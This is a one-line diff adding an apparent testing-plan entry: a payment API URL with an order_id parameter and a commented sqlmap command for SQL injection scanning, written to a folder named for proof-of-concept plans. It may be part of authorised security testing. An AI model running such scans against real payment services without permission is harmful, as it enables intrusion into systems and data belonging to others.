@@ -1,0 +1,1 @@
+https://pay-api.aghanim.com/ps/?order_id=ord_eLmCUiIhCDtqgAkD (GET)  # sqlmap.py -u https://pay-api.aghanim.com/ps/?order_id=ord_eLmCUiIhCDtqgAkD --batch --level=2 --risk=1 --threads=1 --delay=1 --timeout=20 --retries=1 "--output-dir=D:/data hermes/poc-plans/aghanim/artifacts/sqlmap_payapi"
